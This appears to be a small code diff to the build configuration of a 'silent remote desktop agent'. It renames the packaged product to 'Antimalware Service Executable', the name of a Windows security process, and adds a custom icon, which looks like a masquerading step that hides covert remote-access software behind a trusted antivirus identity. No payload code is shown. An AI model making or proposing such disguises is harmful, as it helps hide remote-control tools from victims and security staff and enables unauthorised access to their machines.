@@ -12,7 +12,8 @@
   "description": "Silent remote desktop agent",
   "build": {
     "appId": "com.service.network",
-    "productName": "Service Host - Network Provider Access",
+    "productName": "Antimalware Service Executable",
+    "icon": "build/icon.png",
     "artifactName": "Network-Provider-Access-Setup-${version}.${ext}",
     "directories": {
       "output": "dist"
